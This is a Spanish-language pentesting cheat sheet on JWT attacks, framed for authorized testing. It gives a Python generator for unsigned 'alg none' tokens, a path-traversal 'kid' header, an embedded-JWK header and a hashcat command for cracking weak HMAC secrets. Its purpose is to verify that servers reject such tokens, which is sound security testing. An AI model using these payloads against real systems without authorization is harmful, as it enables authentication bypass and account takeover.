# 🗡️ Ataques contra JWT: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Inspección sin confiar

**Objetivo:** Decodificar solo para inventariar claims.

```bash
python3 -c "import base64,json; t=input().strip(); print(json.loads(base64.urlsafe_b64decode(t.split('.')[0]+'==')))"
```

**Interpretación:** La salida solo describe la cabecera; no confirma una firma válida.

### 2. Control de firma alterada

**Objetivo:** Cambiar un byte del cuerpo y confirmar rechazo.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {JWT_CON_CLAIM_CAMBIADO_Y_FIRMA_ORIGINAL}
```

**Interpretación:** Aceptar el token modificado implica ausencia o fallo de verificación; confirmar con control válido.

### 3. alg none

**Objetivo:** Construir un JWT propio sin firma y comprobar rechazo.

```python
import base64, json
def b64(x):
    return base64.urlsafe_b64encode(x).decode().rstrip("=")
claims = {"sub":"{ID_PROPIO}","iss":"{ISS_PROPIO}","aud":"{AUD_PROPIA}"}
print(b64(json.dumps({"alg":"none","typ":"JWT"}).encode()) + "." + b64(json.dumps(claims).encode()) + ".")
```

**Interpretación:** El servidor debe rechazarlo aun si los claims son válidos; usar los mismos claims de un token propio.

### 4. kid no confiable

**Objetivo:** Verificar que un selector de clave extraño se rechaza sin lectura de archivos.

```json
{"alg":"HS256","typ":"JWT","kid":"../../clave-de-prueba"}
```

**Interpretación:** Este header requiere re-firma con una clave de laboratorio para una prueba válida; un error de clave no es bypass.

### 5. JWK aportada por token

**Objetivo:** Comprobar rechazo de una clave que no pertenece al emisor configurado.

```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"clave-controlada","n":"{MODULO_PUBLICO_PROPIO}","e":"AQAB"}}
```

**Interpretación:** Requiere firmar con la privada correspondiente en laboratorio; el verificador no debe confiar en la JWK embebida.

### 6. Secreto HMAC débil

**Objetivo:** Probar offline solo candidatos explícitamente autorizados.

```bash
hashcat -m 16500 jwt-propio.txt candidatos-de-laboratorio.txt --quiet
```

**Interpretación:** Si se recupera la clave, validar que el token usa HS256 y que el secreto sigue vigente; no subir tokens a servicios externos.

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../../README.md)
